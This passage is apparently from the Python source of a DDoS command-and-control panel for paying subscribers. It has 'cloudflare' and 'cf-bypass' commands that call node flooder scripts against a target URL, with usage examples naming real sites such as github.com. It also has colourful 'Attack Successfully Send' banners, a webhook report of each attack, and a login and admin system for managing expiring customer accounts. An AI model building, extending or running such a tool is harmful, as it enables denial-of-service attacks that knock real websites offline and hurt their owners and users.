           \x1b[38;2;243;12;255m╔═════╩\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╩═\x1b[38;2;75;180;255m════╗
                   👾 \x1b[38;2;0;255;255m𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅 👾
                   
                   \x1b[38;2;255;255;255mHOST: [{url}]
                   PORT: [{port}]
                   TIME: [{time}]
                   METHOD: [cloudflare]
                   Sent On: [{uname}]
                   COOLDOWN : [0]
                   CONCS    : [1]
                   VIP      : [\x1b[38;2;0;212;14mTrue\x1b[38;2;255;255;255m]
           \x1b[38;2;243;12;255m╚══════\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m══\x1b[38;2;75;180;255m════╝\x1b[0m
                   
""")
                os.system(f"node ./data/cf.js {url} {time} {th}")
            except IndexError:
                print("Usage : cloudflare <url> <port> <time> <thread>")
                print("Example : cloudflare https://lequocviet.tk 443 1000 10")
        elif "cf-bypass" in cnc:
            try:
                url=cnc.split()[1]
                port=cnc.split()[2]
                th=cnc.split()[3]
                time=cnc.split()[4]
                Screen.wrapper(atk)
                os.system("cls" if os.name == "nt" else "clear")
                send_attack_webhook(uname, url, port, time)
                print(f"""
                  \x1b[38;2;255;0;255m╔\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╗\x1b[38;2;225;30;255m╔╦\x1b[38;2;219;36;255m╗\x1b[38;2;213;42;255m╔\x1b[38;2;207;48;255m╦╗\x1b[38;2;201;54;255m╔═\x1b[38;2;195;60;255m╗\x1b[38;2;189;66;255m╔═\x1b[38;2;183;72;255m╗\x1b[38;2;177;78;255m╦\x1b[38;2;171;84;255m╔\x1b[38;2;165;90;255m═  \x1b[38;2;159;96;255m╔\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m╗\x1b[38;2;141;114;255m╔\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m╗\x1b[38;2;123;132;255m╔\x1b[38;2;117;138;255m╗\x1b[38;2;111;144;255m╔\x1b[38;2;87;168;255m╔\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╗
                  \x1b[38;2;255;0;255m╠\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╣ \x1b[38;2;225;30;255m║  \x1b[38;2;219;36;255m║ \x1b[38;2;213;42;255m╠═\x1b[38;2;207;48;255m╣\x1b[38;2;201;54;255m║  \x1b[38;2;195;60;255m╠\x1b[38;2;189;66;255m╩\x1b[38;2;183;72;255m╗ \x1b[38;2;177;78;255m ╚\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m╗\x1b[38;2;159;96;255m║\x1b[38;2;153;102;255m╣\x1b[38;2;147;108;255m ║\x1b[38;2;141;114;255m║\x1b[38;2;135;120;255m║\x1b[38;2;75;180;255m ║\x1b[38;2;75;180;255m║
                  \x1b[38;2;255;0;255m╩ \x1b[38;2;237;18;255m╩ \x1b[38;2;231;24;255m╩ \x1b[38;2;225;30;255m ╩ \x1b[38;2;219;36;255m╩ \x1b[38;2;213;42;255m╩\x1b[38;2;207;48;255m╚═\x1b[38;2;201;54;255m╝\x1b[38;2;195;60;255m╩ \x1b[38;2;189;66;255m╩  \x1b[38;2;183;72;255m╚\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m╝\x1b[38;2;165;90;255m╚\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m╝\x1b[38;2;147;108;255m╝\x1b[38;2;141;114;255m╚\x1b[38;2;135;120;255m╝\x1b[38;2;87;168;255m═\x1b[38;2;75;180;255m╩\x1b[38;2;75;180;255m╝
                \x1b[38;2;243;12;255m╚╦\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╝
           \x1b[38;2;243;12;255m╔═════╩\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╩═\x1b[38;2;75;180;255m════╗
                   👾 \x1b[38;2;0;255;255m𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅 👾
                   
                   \x1b[38;2;255;255;255mTARGET   : [{url}]
                   PORT     : [{port}]
                   DURATION : [{time}]
                   METHOD   : [cf-bypass]
                   SENT BY  : [{uname}]
                   COOLDOWN : [0]
                   CONCS    : [1]
                   VIP      : [\x1b[38;2;0;212;14mTrue\x1b[38;2;255;255;255m]
           \x1b[38;2;243;12;255m╚══════\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m══\x1b[38;2;75;180;255m════╝\x1b[0m
                   
""")
                os.system(f"node ./data/bypasserr.js {url} {th} {time}")
            except IndexError:
                print("Usage : cf-bypass <url> <port> <thread<10> <time>")
                print("Example : cf-bypass https://github.com/ 443 10 60")
        else:
            try:
                cmd=cnc.split()[0]
                print("Command : [ "+cmd+" ] Not Found!!")
            except IndexError:
                pass

                
            


def load_users():
    users = {}
    try:
        with open(users_file, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    user, passwd, expiry_date = line.split(":")
                    users[user] = {"password": passwd, "expiry_date": expiry_date}
    except FileNotFoundError:
        print("❌ [ERROR] users.txt file not found. Please ensure it’s available.")
        sys.exit(1)
    return users

def show_menu():
    print("┌───────────────────────────────────────────────┐")
    print("│               🔒 Login Menu 🔒               │")
    print("├───────────────────────────────────────────────┤")
    print("│ Please enter your credentials to proceed      │")
    print("└───────────────────────────────────────────────┘")

def login():
    global logged_in_user
    users = load_users()
    logged_in_user = None
    attempts = 0

    while attempts < MAX_ATTEMPTS:
        show_menu()
        print("\n┌───────────────────────────────────────────────┐")
        username = input("│ ⚡ Username: ")
        print("├───────────────────────────────────────────────┤")
        password = getpass.getpass(prompt="│ ⚡ Password: ")
        print("└───────────────────────────────────────────────┘\n")

        if username in users:
            user_data = users[username]
            expiry_date = user_data["expiry_date"]

            # Check if expiry_date is present
            if expiry_date:
                expiry_datetime = datetime.strptime(expiry_date, "%m/%d/%y")
                if datetime.now() > expiry_datetime:
                    print("🚫 Your user has expired! Please contact an administrator.")
                    sys.exit(1)

            # Validate password
            if password == user_data["password"]:
                logged_in_user = username
                print(f"✅ Login successful! Redirecting...")
                update_title_bar(username)  # Update the title bar
                time.sleep(1)
                main(username)  # Proceed to main function
            else:
                print("❌ Incorrect password.")
        else:
            print("❌ Username not found.")

        attempts += 1
        print(f"({attempts}/{MAX_ATTEMPTS} attempts used)")
        if attempts >= MAX_ATTEMPTS:
            print("🚫 Maximum attempts reached.")

# Function to handle main admin actions
def admin():
    if logged_in_user != "root":
        print("⛔ You do not have permission to perform admin actions.")
        sys.exit(1)
    
    print(f"⚡ Welcome, {logged_in_user}! You are logged in as admin.")
    print("Choose an admin command:")
    print("1. adduser <username> <password> <isAdmin>")
    print("2. deluser <username>")
    print("3. addays <username> <days> <true/false>")
    print("4. Exit")
    
    command = input("⚡ Enter command: ").strip()
    
    if command.startswith("adduser"):
        adduser(command)
    elif command.startswith("deluser"):
        deluser(command)
    elif command.startswith("addays"):
        addays(command)
    elif command == "4":
        sys.exit(0)
    else:
        print("❌ Invalid command.")
        main()

# Add user command
def adduser(command):
    parts = command.split()
    if len(parts) != 4:
        print("❌ Invalid command format. Use: adduser <username> <password> <expiry_date>")
        return

    username = parts[1]
    password = parts[2]
    expiry_date = parts[3]

    try:
        # Validate expiry date format
        expiry_date_parsed = datetime.strptime(expiry_date, "%m/%d/%y")
        with open(users_file, "a") as file:
            file.write(f"{username}:{password}:{expiry_date}\n")
        print(f"(cnc) '{username}' added to net successfully with expiry date {expiry_date}.")
    except ValueError:
        print("❌ Invalid expiry date format. Use MM/DD/YY.")

    

# Delete user command
def deluser(command):
    parts = command.split()
    if len(parts) != 2:
        print("❌ Invalid command format.")
        return
    
    username = parts[1]
    
    # Read all users
    users = []
    with open(users_file, "r") as file:
        users = file.readlines()
    
    # Filter out the user to be deleted
    users = [user for user in users if not user.startswith(username + " ")]
    
    # Write back the remaining users to the file
    with open(users_file, "w") as file:
        file.writelines(users)
    
    print(f"✅ User '{username}' deleted successfully.")

# Add days to user command
def addays(command):
    parts = command.split()
    if len(parts) != 3:
        print("❌ Invalid command format.")
        return
    
    username = parts[1]
    days = int(parts[2]) if parts[2].isdigit() else 0
    print(f"✅ User '{username}' added {days} days.")

login()
